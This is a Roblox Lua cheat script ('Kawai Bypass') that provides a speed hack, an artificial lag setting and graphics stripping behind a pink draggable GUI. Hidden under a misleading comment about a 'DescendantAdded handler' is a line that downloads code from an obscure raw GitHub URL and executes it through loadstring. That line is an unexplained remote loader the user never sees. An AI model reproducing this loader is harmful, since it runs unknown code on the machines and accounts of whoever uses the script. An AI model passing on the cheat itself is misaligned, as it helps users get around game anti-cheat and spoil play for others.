local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui          = game:GetService("CoreGui")
local Lighting         = game:GetService("Lighting")
local Workspace        = game:GetService("Workspace")

local lp = Players.LocalPlayer

local SPEED_AMOUNT = 31.25
local LAG_AMOUNT   = 0.005

local enabled         = false
local lagOnly         = false
local toggleKey       = Enum.KeyCode.V
local listeningForKey = false
local minimized       = false
local lastKeybindSet  = 0

local antiLagDescConn = nil
local origEffects     = {}
local origWorkspace   = {}
local origSaved       = false

-- Mobile detection
local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

-- Configuration persistence
local cfg = lp.PlayerGui:FindFirstChild("_KawaiCfg")
if not cfg then
    cfg        = Instance.new("Folder")
    cfg.Name   = "_KawaiCfg"
    cfg.Parent = lp.PlayerGui
end

local function cfgGet(name, default)
    local v = cfg:FindFirstChild(name)
    return v and v.Value or default
end

local function cfgSet(name, value, class)
    local v = cfg:FindFirstChild(name)
    if not v then
        v        = Instance.new(class or "BoolValue")
        v.Name   = name
        v.Parent = cfg
    end
    v.Value = value
end

-- Load saved settings
SPEED_AMOUNT = cfgGet("SpeedAmount", 31.25)
LAG_AMOUNT   = cfgGet("LagAmount", 0.005)
lagOnly      = cfgGet("LagOnly", false)

if not cfg:FindFirstChild("_OrigSaved") then
    cfgSet("_OrigSaved",        true,                              "BoolValue")
    cfgSet("OrigGlobalShadows", Lighting.GlobalShadows,            "BoolValue")
    cfgSet("OrigFogEnd",        Lighting.FogEnd,                   "NumberValue")
    cfgSet("OrigBrightness",    Lighting.Brightness,               "NumberValue")
    cfgSet("OrigEnvDiffuse",    Lighting.EnvironmentDiffuseScale,  "NumberValue")
    cfgSet("OrigEnvSpecular",   Lighting.EnvironmentSpecularScale, "NumberValue")
end

-- Cache original effects
for _, e in pairs(Lighting:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
    or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        origEffects[e] = e.Enabled
    end
end

-- Track processed objects to avoid duplicate work
local processedObjects = {}
local function processObj(obj)
    if processedObjects[obj] then return end
    processedObjects[obj] = true
    
    if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") then
        obj.Enabled = false
    elseif obj:IsA("Decal") or obj:IsA("Texture") then
        obj.Transparency = 1
    elseif obj:IsA("BasePart") then
        obj.Material    = Enum.Material.Plastic
        obj.Reflectance = 0
        obj.CastShadow  = false
    end
end

-- Track watched objects to avoid duplicate connections
local watchedObjects = {}
local function watchPartProps(obj)
    if watchedObjects[obj] or not obj:IsA("BasePart") then return end
    watchedObjects[obj] = true
    
    obj:GetPropertyChangedSignal("Material"):Connect(function()
        if obj.Parent and obj.Material ~= Enum.Material.Plastic then
            pcall(function() obj.Material = Enum.Material.Plastic end)
        end
    end)
    
    obj:GetPropertyChangedSignal("Reflectance"):Connect(function()
        if obj.Parent and obj.Reflectance ~= 0 then
            pcall(function() obj.Reflectance = 0 end)
        end
    end)
    
    obj:GetPropertyChangedSignal("CastShadow"):Connect(function()
        if obj.Parent and obj.CastShadow then
            pcall(function() obj.CastShadow = false end)
        end
    end)
end

local function doOptimize()
    Lighting.GlobalShadows            = false
    Lighting.FogEnd                   = 9e9
    Lighting.Brightness               = 1
    Lighting.EnvironmentDiffuseScale  = 0
    Lighting.EnvironmentSpecularScale = 0
    
    for _, e in pairs(Lighting:GetChildren()) do
        if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
        or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
            e.Enabled = false
        end
    end
    
    for _, obj in pairs(Workspace:GetDescendants()) do 
        if obj:IsA("BasePart") or obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Decal") or obj:IsA("Texture") then
            pcall(function() processObj(obj) end)
        end
        if obj:IsA("BasePart") then
            watchPartProps(obj)
        end
    end
end

local function doRestore()
    Lighting.GlobalShadows            = cfgGet("OrigGlobalShadows", true)
    Lighting.FogEnd                   = cfgGet("OrigFogEnd",        100000)
    Lighting.Brightness               = cfgGet("OrigBrightness",    2)
    Lighting.EnvironmentDiffuseScale  = cfgGet("OrigEnvDiffuse",    1)
    Lighting.EnvironmentSpecularScale = cfgGet("OrigEnvSpecular",   1)
    for e, was in pairs(origEffects) do
        if e and e.Parent then e.Enabled = was end
    end
    pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic end)
end

-- Apply optimizations once
pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
pcall(function() doOptimize() end)

-- Throttled DescendantAdded handler
loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
local lastProcessTime = 0
local processQueue = {}

antiLagDescConn = Workspace.DescendantAdded:Connect(function(obj)
    if not (obj:IsA("BasePart") or obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Decal") or obj:IsA("Texture")) then
        return
    end
    
    processQueue[obj] = true
    
    local currentTime = tick()
    if currentTime - lastProcessTime < 0.5 then return end
    lastProcessTime = currentTime
    
    task.defer(function()
        for queuedObj in pairs(processQueue) do
            if queuedObj and queuedObj.Parent then
                pcall(function() processObj(queuedObj) end)
                if queuedObj:IsA("BasePart") then
                    watchPartProps(queuedObj)
                end
            end
            processQueue[queuedObj] = nil
        end
    end)
end)

-- Speed + Lag loop - PROPER LAG WITHOUT task.wait()
RunService.Heartbeat:Connect(function()
    if not enabled then return end
    
    -- Speed bypass
    if not lagOnly then
        local char = lp.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hrp and hum and hum.MoveDirection.Magnitude > 0 then
                hrp.Velocity = Vector3.new(
                    hum.MoveDirection.X * SPEED_AMOUNT,
                    hrp.Velocity.Y,
                    hum.MoveDirection.Z * SPEED_AMOUNT
                )
            end
        end
    end
    
    -- PROPER LAG: Busy-wait to freeze the game
    if LAG_AMOUNT > 0 then
        local t = tick()
        while tick() - t < LAG_AMOUNT do end
    end
end)

-- Pink color palette
local PINK       = Color3.fromRGB(255, 105, 180)
local HOT_PINK   = Color3.fromRGB(255, 20, 147)
local LIGHT_PINK = Color3.fromRGB(255, 182, 193)
local DARK_PINK  = Color3.fromRGB(199, 21, 133)
local BG_PINK    = Color3.fromRGB(40, 15, 30)
local BTN_PINK   = Color3.fromRGB(50, 20, 40)
local ROW_BG     = Color3.fromRGB(35, 20, 35)
local MIN_NORM   = Color3.fromRGB(50, 20, 40)
local MIN_HOV    = Color3.fromRGB(80, 30, 60)
local WHITE      = Color3.new(1, 1, 1)
local SAVE_BG    = Color3.fromRGB(60, 25, 50)
local SAVE_HOV   = Color3.fromRGB(90, 35, 70)

local TITLE_GRAD = ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.fromRGB(255, 105, 180)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 20, 147)),
    ColorSequenceKeypoint.new(1,   Color3.fromRGB(255, 182, 193)),
})

local function animGrad(grad, speed)
    task.spawn(function()
        while grad and grad.Parent do
            grad.Rotation = (grad.Rotation + speed) % 360
            task.wait(0.05)
        end
    end)
end

local function pinkStroke(parent, thickness)
    local s = Instance.new("UIStroke")
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Thickness = thickness or 1.5
    s.Color     = PINK
    s.Parent    = parent
end

local existing = CoreGui:FindFirstChild("KawaiBypass")
if existing then existing:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name           = "KawaiBypass"
ScreenGui.ResetOnSpawn   = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder   = 999
ScreenGui.Parent         = CoreGui

-- Bigger GUI for mobile
local GUI_W   = isMobile and 300 or 280
local GUI_H   = isMobile and 280 or 250
local GUI_MIN = 40

local Frame = Instance.new("Frame")
Frame.Size                   = UDim2.new(0, GUI_W, 0, GUI_H)
Frame.Position               = UDim2.new(0.5, -GUI_W/2, 0.5, -GUI_H/2)
Frame.BackgroundColor3       = BG_PINK
Frame.BackgroundTransparency = 0.1
Frame.BorderSizePixel        = 0
Frame.Active                 = true
Frame.ClipsDescendants       = true
Frame.Parent                 = ScreenGui
Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)
pinkStroke(Frame, 2)

-- Title bar (draggable)
local TitleBar = Instance.new("Frame")
TitleBar.Size             = UDim2.new(1, 0, 0, isMobile and 45 or 35)
TitleBar.BackgroundTransparency = 1
TitleBar.Parent           = Frame

local Title = Instance.new("TextLabel")
Title.Size               = UDim2.new(1, -70, 0, isMobile and 30 or 26)
Title.Position           = UDim2.new(0, isMobile and 12 or 10, 0, isMobile and 8 or 5)
Title.BackgroundTransparency = 1
Title.Text               = "Kawai Bypass"
Title.TextColor3         = WHITE
Title.TextSize           = isMobile and 22 or 18
Title.Font               = Enum.Font.Fantasy
Title.TextXAlignment     = Enum.TextXAlignment.Left
Title.TextYAlignment     = Enum.TextYAlignment.Center
Title.Parent             = TitleBar
local tGrad = Instance.new("UIGradient")
tGrad.Color = TITLE_GRAD; tGrad.Rotation = 0; tGrad.Parent = Title
animGrad(tGrad, 1.2)

-- Minimize button
local MinBtn = Instance.new("TextButton")
MinBtn.Size             = UDim2.new(0, isMobile and 34 or 26, 0, isMobile and 34 or 26)
MinBtn.Position         = UDim2.new(1, isMobile and -80 or -60, 0, isMobile and 6 or 5)
MinBtn.BackgroundColor3 = MIN_NORM
MinBtn.BorderSizePixel  = 0
MinBtn.Text             = "v"
MinBtn.TextColor3       = LIGHT_PINK
MinBtn.TextSize         = isMobile and 18 or 14
MinBtn.Font             = Enum.Font.Fantasy
MinBtn.AutoButtonColor  = false
MinBtn.Parent           = Frame
Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, isMobile and 9 or 7)
pinkStroke(MinBtn, 1.5)

local minScale = Instance.new("UIScale")
minScale.Scale = 1; minScale.Parent = MinBtn

MinBtn.MouseEnter:Connect(function()
    TweenService:Create(MinBtn, TweenInfo.new(0.15), {BackgroundColor3 = MIN_HOV}):Play()
end)
MinBtn.MouseLeave:Connect(function()
    TweenService:Create(MinBtn, TweenInfo.new(0.15), {BackgroundColor3 = MIN_NORM}):Play()
end)
MinBtn.MouseButton1Down:Connect(function()
    TweenService:Create(MinBtn,   TweenInfo.new(0.05), {BackgroundColor3 = DARK_PINK}):Play()
    TweenService:Create(minScale, TweenInfo.new(0.07, Enum.EasingStyle.Linear), {Scale = 0.9}):Play()
    task.delay(0.07, function()
        TweenService:Create(MinBtn,   TweenInfo.new(0.18), {BackgroundColor3 = MIN_NORM}):Play()
        TweenService:Create(minScale, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
    end)
end)

-- Save Config button
local saveBtn = Instance.new("TextButton")
saveBtn.Size             = UDim2.new(0, isMobile and 40 or 34, 0, isMobile and 34 or 26)
saveBtn.Position         = UDim2.new(1, isMobile and -38 or -30, 0, isMobile and 6 or 5)
saveBtn.BackgroundColor3 = SAVE_BG
saveBtn.BorderSizePixel  = 0
saveBtn.Text             = "Save Config"
saveBtn.TextColor3       = LIGHT_PINK
saveBtn.TextSize         = isMobile and 11 or 9
saveBtn.Font             = Enum.Font.GothamBold
saveBtn.AutoButtonColor  = false
saveBtn.TextWrapped      = true
saveBtn.Parent           = Frame
Instance.new("UICorner", saveBtn).CornerRadius = UDim.new(0, isMobile and 9 or 7)
pinkStroke(saveBtn, 1.5)

local saveScale = Instance.new("UIScale")
saveScale.Scale = 1; saveScale.Parent = saveBtn

saveBtn.MouseEnter:Connect(function()
    TweenService:Create(saveBtn, TweenInfo.new(0.15), {BackgroundColor3 = SAVE_HOV}):Play()
end)
saveBtn.MouseLeave:Connect(function()
    TweenService:Create(saveBtn, TweenInfo.new(0.15), {BackgroundColor3 = SAVE_BG}):Play()
end)

local function saveAllConfig()
    cfgSet("SpeedAmount", SPEED_AMOUNT, "NumberValue")
    cfgSet("LagAmount", LAG_AMOUNT, "NumberValue")
    cfgSet("LagOnly", lagOnly, "BoolValue")
    cfgSet("ToggleKey", toggleKey.Name, "StringValue")
    
    -- Flash effect
    TweenService:Create(saveBtn, TweenInfo.new(0.1), {BackgroundColor3 = HOT_PINK}):Play()
    TweenService:Create(saveScale, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {Scale = 1.1}):Play()
    task.delay(0.1, function()
        TweenService:Create(saveBtn, TweenInfo.new(0.3), {BackgroundColor3 = SAVE_BG}):Play()
        TweenService:Create(saveScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
    end)
end

saveBtn.MouseButton1Click:Connect(saveAllConfig)

-- Helper function to create slider rows
local function createSliderRow(yOffset, label, min, max, default, onChange, isFloat)
    local rowHeight = isMobile and 40 or 34
    local row = Instance.new("Frame")
    row.Position         = UDim2.new(0, isMobile and 14 or 10, 0, yOffset)
    row.Size             = UDim2.new(1, isMobile and -28 or -20, 0, rowHeight)
    row.BackgroundColor3 = ROW_BG
    row.BorderSizePixel  = 0
    row.Parent           = Frame
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
    pinkStroke(row, 1.5)
    
    local lbl = Instance.new("TextLabel")
    lbl.Size               = UDim2.new(0, isMobile and 70 or 60, 1, 0)
    lbl.Position           = UDim2.new(0, isMobile and 10 or 8, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text               = label
    lbl.TextColor3         = LIGHT_PINK
    lbl.TextSize           = isMobile and 14 or 11
    lbl.Font               = Enum.Font.GothamBold
    lbl.TextXAlignment     = Enum.TextXAlignment.Left
    lbl.Parent             = row
    
    local valLbl = Instance.new("TextLabel")
    valLbl.Size               = UDim2.new(0, isMobile and 55 or 45, 1, 0)
    valLbl.Position           = UDim2.new(0, isMobile and 82 or 65, 0, 0)
    valLbl.BackgroundTransparency = 1
    valLbl.Text               = tostring(default)
    valLbl.TextColor3         = HOT_PINK
    valLbl.TextSize           = isMobile and 12 or 10
    valLbl.Font               = Enum.Font.GothamBold
    valLbl.TextXAlignment     = Enum.TextXAlignment.Left
    valLbl.Parent             = row
    
    local slider = Instance.new("Frame")
    slider.Size             = UDim2.new(1, isMobile and -150 or -125, 0, isMobile and 10 or 6)
    slider.Position         = UDim2.new(0, isMobile and 135 or 110, 0.5, isMobile and -5 or -3)
    slider.BackgroundColor3 = Color3.fromRGB(60, 30, 50)
    slider.BorderSizePixel  = 0
    slider.ZIndex           = 5
    slider.Parent           = row
    Instance.new("UICorner", slider).CornerRadius = UDim.new(0, isMobile and 5 or 3)
    
    local fill = Instance.new("Frame")
    fill.Size             = UDim2.new((default - min) / (max - min), 0, 1, 0)
    fill.BackgroundColor3 = PINK
    fill.BorderSizePixel  = 0
    fill.ZIndex           = 6
    fill.Parent           = slider
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, isMobile and 5 or 3)
    
    local knobSize = isMobile and 22 or 14
    local knob = Instance.new("Frame")
    knob.Size             = UDim2.new(0, knobSize, 0, knobSize)
    knob.Position         = UDim2.new((default - min) / (max - min), -knobSize/2, 0.5, -knobSize/2)
    knob.BackgroundColor3 = HOT_PINK
    knob.BorderSizePixel  = 0
    knob.ZIndex           = 7
    knob.Parent           = slider
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
    
    local dragging = false
    
    local function updateSlider(inputX)
        local relX = math.clamp((inputX - slider.AbsolutePosition.X) / slider.AbsoluteSize.X, 0, 1)
        local value = min + (max - min) * relX
        if isFloat then
            value = math.round(value * 10000) / 10000
        else
            value = math.round(value * 100) / 100
        end
        knob.Position = UDim2.new(relX, -knobSize/2, 0.5, -knobSize/2)
        fill.Size = UDim2.new(relX, 0, 1, 0)
        valLbl.Text = tostring(value)
        onChange(value)
    end
    
    local sliderBtn = Instance.new("TextButton")
    sliderBtn.Size               = UDim2.new(1, isMobile and 40 or 20, 1, isMobile and 30 or 10)
    sliderBtn.Position           = UDim2.new(0, isMobile and -20 or -10, 0, isMobile and -15 or -5)
    sliderBtn.BackgroundTransparency = 1
    sliderBtn.Text               = ""
    sliderBtn.ZIndex             = 8
    sliderBtn.Parent             = slider
    
    sliderBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            updateSlider(input.Position.X)
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            updateSlider(input.Position.X)
        end
    end)
    
    return row
end

-- Speed slider (max 200)
local speedSliderRow = createSliderRow(isMobile and 52 or 44, "Speed", 10, 200, SPEED_AMOUNT, function(val)
    SPEED_AMOUNT = val
    cfgSet("SpeedAmount", val, "NumberValue")
end, false)

-- Lag slider (max 0.2 for extreme lag)
createSliderRow(isMobile and 102 or 84, "Lag", 0, 0.2, LAG_AMOUNT, function(val)
    LAG_AMOUNT = val
    cfgSet("LagAmount", val, "NumberValue")
end, true)

-- Lag Only toggle row
local lagOnlyRowY = isMobile and 152 or 126
local lagOnlyRow = Instance.new("Frame")
lagOnlyRow.Position         = UDim2.new(0, isMobile and 14 or 10, 0, lagOnlyRowY)
lagOnlyRow.Size             = UDim2.new(1, isMobile and -28 or -20, 0, isMobile and 34 or 26)
lagOnlyRow.BackgroundColor3 = ROW_BG
lagOnlyRow.BorderSizePixel  = 0
lagOnlyRow.Parent           = Frame
Instance.new("UICorner", lagOnlyRow).CornerRadius = UDim.new(0, 6)
pinkStroke(lagOnlyRow, 1.2)

local lagOnlyLbl = Instance.new("TextLabel")
lagOnlyLbl.Size               = UDim2.new(0, isMobile and 150 or 120, 1, 0)
lagOnlyLbl.Position           = UDim2.new(0, isMobile and 12 or 10, 0, 0)
lagOnlyLbl.BackgroundTransparency = 1
lagOnlyLbl.Text               = "Lag Only Mode"
lagOnlyLbl.TextColor3         = LIGHT_PINK
lagOnlyLbl.TextSize           = isMobile and 15 or 11
lagOnlyLbl.Font               = Enum.Font.GothamBold
lagOnlyLbl.TextXAlignment     = Enum.TextXAlignment.Left
lagOnlyLbl.Parent             = lagOnlyRow

local lagOnlyTrack = Instance.new("Frame")
lagOnlyTrack.Size                   = UDim2.new(0, isMobile and 44 or 32, 0, isMobile and 22 or 16)
lagOnlyTrack.Position               = UDim2.new(1, isMobile and -56 or -42, 0.5, isMobile and -11 or -8)
lagOnlyTrack.BackgroundColor3       = Color3.fromRGB(60, 30, 50)
lagOnlyTrack.BorderSizePixel        = 0
lagOnlyTrack.Parent                 = lagOnlyRow
Instance.new("UICorner", lagOnlyTrack).CornerRadius = UDim.new(0, isMobile and 11 or 8)
pinkStroke(lagOnlyTrack, 1.2)

local lagOnlyKnob = Instance.new("Frame")
lagOnlyKnob.Size                 = UDim2.new(0, isMobile and 20 or 14, 0, isMobile and 20 or 14)
lagOnlyKnob.Position             = UDim2.new(0, 1, 0.5, isMobile and -10 or -7)
lagOnlyKnob.BackgroundColor3     = LIGHT_PINK
lagOnlyKnob.BorderSizePixel      = 0
lagOnlyKnob.Parent               = lagOnlyTrack
Instance.new("UICorner", lagOnlyKnob).CornerRadius = UDim.new(1, 0)

local lagOnlyBtn = Instance.new("TextButton")
lagOnlyBtn.Size               = UDim2.new(0, isMobile and 56 or 42, 1, 0)
lagOnlyBtn.Position           = UDim2.new(1, isMobile and -56 or -42, 0, 0)
lagOnlyBtn.BackgroundTransparency = 1
lagOnlyBtn.Text               = ""
lagOnlyBtn.Parent             = lagOnlyRow

local function setLagOnly(state)
    lagOnly = state
    cfgSet("LagOnly", state, "BoolValue")
    local tw = TweenInfo.new(0.2, Enum.EasingStyle.Quart)
    local offset = state and (isMobile and 23 or 17) or 1
    TweenService:Create(lagOnlyKnob, tw, {
        Position = UDim2.new(0, offset, 0.5, isMobile and -10 or -7),
        BackgroundColor3 = state and HOT_PINK or LIGHT_PINK,
    }):Play()
    TweenService:Create(lagOnlyTrack, tw, {
        BackgroundColor3 = state and Color3.fromRGB(80, 20, 60) or Color3.fromRGB(60, 30, 50),
    }):Play()
    -- Grey out speed slider when lag only mode
    speedSliderRow.BackgroundTransparency = state and 0.5 or 0
    for _, child in pairs(speedSliderRow:GetDescendants()) do
        if child:IsA("TextLabel") then
            child.TextTransparency = state and 0.5 or 0
        end
    end
end

lagOnlyBtn.MouseButton1Click:Connect(function() setLagOnly(not lagOnly) end)

-- Toggle row
local toggleRowY = isMobile and 198 or 164
local toggleRow = Instance.new("Frame")
toggleRow.Position         = UDim2.new(0, isMobile and 14 or 10, 0, toggleRowY)
toggleRow.Size             = UDim2.new(1, isMobile and -28 or -20, 0, isMobile and 38 or 30)
toggleRow.BackgroundColor3 = ROW_BG
toggleRow.BorderSizePixel  = 0
toggleRow.Parent           = Frame
Instance.new("UICorner", toggleRow).CornerRadius = UDim.new(0, 8)
pinkStroke(toggleRow, 1.5)

local togLbl = Instance.new("TextLabel")
togLbl.Size               = UDim2.new(1, isMobile and -130 or -100, 1, 0)
togLbl.Position           = UDim2.new(0, isMobile and 12 or 10, 0, 0)
togLbl.BackgroundTransparency = 1
togLbl.Text               = "Speed Bypass"
togLbl.TextColor3         = LIGHT_PINK
togLbl.TextSize           = isMobile and 16 or 12
togLbl.Font               = Enum.Font.Fantasy
togLbl.TextXAlignment     = Enum.TextXAlignment.Left
togLbl.Parent             = toggleRow

-- Keybind badge
local kbBadge = Instance.new("Frame")
kbBadge.Size             = UDim2.new(0, isMobile and 40 or 30, 0, isMobile and 24 or 18)
kbBadge.Position         = UDim2.new(1, isMobile and -110 or -84, 0.5, isMobile and -12 or -9)
kbBadge.BackgroundColor3 = BTN_PINK
kbBadge.BorderSizePixel  = 0
kbBadge.Parent           = toggleRow
Instance.new("UICorner", kbBadge).CornerRadius = UDim.new(0, isMobile and 7 or 5)
pinkStroke(kbBadge, 1.2)

local kbLbl = Instance.new("TextLabel")
kbLbl.Size               = UDim2.new(1, 0, 1, 0)
kbLbl.BackgroundTransparency = 1
kbLbl.Text               = isMobile and "Tap" or "V"
kbLbl.TextColor3         = LIGHT_PINK
kbLbl.TextSize           = isMobile and 11 or 9
kbLbl.Font               = Enum.Font.GothamBold
kbLbl.TextXAlignment     = Enum.TextXAlignment.Center
kbLbl.Parent             = kbBadge

local kbBtn = Instance.new("TextButton")
kbBtn.Size               = UDim2.new(1, 0, 1, 0)
kbBtn.BackgroundTransparency = 1
kbBtn.Text               = ""
kbBtn.Parent             = kbBadge

-- Toggle switch
local togTrack = Instance.new("Frame")
togTrack.Size                   = UDim2.new(0, isMobile and 48 or 36, 0, isMobile and 24 or 18)
togTrack.Position               = UDim2.new(1, isMobile and -60 or -46, 0.5, isMobile and -12 or -9)
togTrack.BackgroundColor3       = Color3.fromRGB(60, 30, 50)
togTrack.BackgroundTransparency = 0
togTrack.BorderSizePixel        = 0
togTrack.Parent                 = toggleRow
Instance.new("UICorner", togTrack).CornerRadius = UDim.new(0, isMobile and 12 or 9)
pinkStroke(togTrack, 1.5)

local togKnob = Instance.new("Frame")
togKnob.Size                 = UDim2.new(0, isMobile and 22 or 16, 0, isMobile and 22 or 16)
togKnob.Position             = UDim2.new(0, 1, 0.5, isMobile and -11 or -8)
togKnob.BackgroundColor3     = LIGHT_PINK
togKnob.BorderSizePixel      = 0
togKnob.Parent               = togTrack
Instance.new("UICorner", togKnob).CornerRadius = UDim.new(1, 0)

local togBtn = Instance.new("TextButton")
togBtn.Size               = UDim2.new(0, isMobile and 60 or 46, 1, 0)
togBtn.Position           = UDim2.new(1, isMobile and -60 or -46, 0, 0)
togBtn.BackgroundTransparency = 1
togBtn.Text               = ""
togBtn.Parent             = toggleRow

local function setEnabled(state)
    enabled = state
    local tw = TweenInfo.new(0.2, Enum.EasingStyle.Quart)
    local offset = state and (isMobile and 25 or 19) or 1
    TweenService:Create(togKnob, tw, {
        Position = UDim2.new(0, offset, 0.5, isMobile and -11 or -8),
        BackgroundColor3 = state and HOT_PINK or LIGHT_PINK,
    }):Play()
    TweenService:Create(togTrack, tw, {
        BackgroundColor3 = state and Color3.fromRGB(80, 20, 60) or Color3.fromRGB(60, 30, 50),
    }):Play()
end

togBtn.MouseButton1Click:Connect(function() setEnabled(not enabled) end)

kbBtn.MouseButton1Click:Connect(function()
    if isMobile then
        setEnabled(not enabled)
        return
    end
    if listeningForKey then return end
    listeningForKey  = true
    kbLbl.Text       = "..."
    kbLbl.TextColor3 = Color3.fromRGB(255, 255, 150)
end)

local function setMinimized(state)
    minimized   = state
    MinBtn.Text = state and "^" or "v"
    TweenService:Create(Frame, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
        Size = state and UDim2.new(0, GUI_W, 0, GUI_MIN) or UDim2.new(0, GUI_W, 0, GUI_H)
    }):Play()
end
MinBtn.MouseButton1Click:Connect(function() setMinimized(not minimized) end)

-- Dragging
local draggingFrame, dragStart, startPos = false, nil, nil

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        local abs = Frame.AbsolutePosition
        Frame.Position = UDim2.new(0, abs.X, 0, abs.Y)
        draggingFrame  = true
        dragStart = input.Position
        startPos  = Frame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if not draggingFrame then return end    if input.UserInputType == Enum.UserInputType.MouseMovement
    or input.UserInputType == Enum.UserInputType.Touch then
        if minimized then draggingFrame = false; return end
        local d = input.Position - dragStart
        local s = Workspace.CurrentCamera.ViewportSize
        Frame.Position = UDim2.new(0,
            math.clamp(startPos.X.Offset + d.X, 0, s.X - GUI_W), 0,
            math.clamp(startPos.Y.Offset + d.Y, 0, s.Y - GUI_H))
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        draggingFrame = false
    end
end)

-- Mobile toggle button
if isMobile then
    local mobileToggle = Instance.new("TextButton")
    mobileToggle.Size           = UDim2.new(0, 50, 0, 50)
    mobileToggle.Position       = UDim2.new(1, -60, 0, 10)
    mobileToggle.BackgroundColor3 = Color3.fromRGB(255, 105, 180)
    mobileToggle.BackgroundTransparency = 0.3
    mobileToggle.Text           = "ON/OFF"
    mobileToggle.TextColor3     = WHITE
    mobileToggle.TextSize       = 11
    mobileToggle.Font           = Enum.Font.GothamBold
    mobileToggle.BorderSizePixel = 0
    mobileToggle.ZIndex         = 10
    mobileToggle.Parent         = ScreenGui
    Instance.new("UICorner", mobileToggle).CornerRadius = UDim.new(1, 0)
    pinkStroke(mobileToggle, 2)
    
    mobileToggle.MouseButton1Click:Connect(function()
        setEnabled(not enabled)
    end)
end

UserInputService.InputBegan:Connect(function(input, gpe)
    if listeningForKey and not isMobile then
        if input.UserInputType == Enum.UserInputType.Keyboard then
            toggleKey        = input.KeyCode
            kbLbl.Text       = input.KeyCode.Name
            kbLbl.TextColor3 = LIGHT_PINK
            listeningForKey  = false
            lastKeybindSet   = tick()
            cfgSet("ToggleKey", input.KeyCode.Name, "StringValue")
        end
        return
    end
    if input.KeyCode == toggleKey and not gpe and (tick() - lastKeybindSet > 0.3) and not isMobile then
        setEnabled(not enabled)
    end
end)

-- Initialize lag only state
setLagOnly(lagOnly)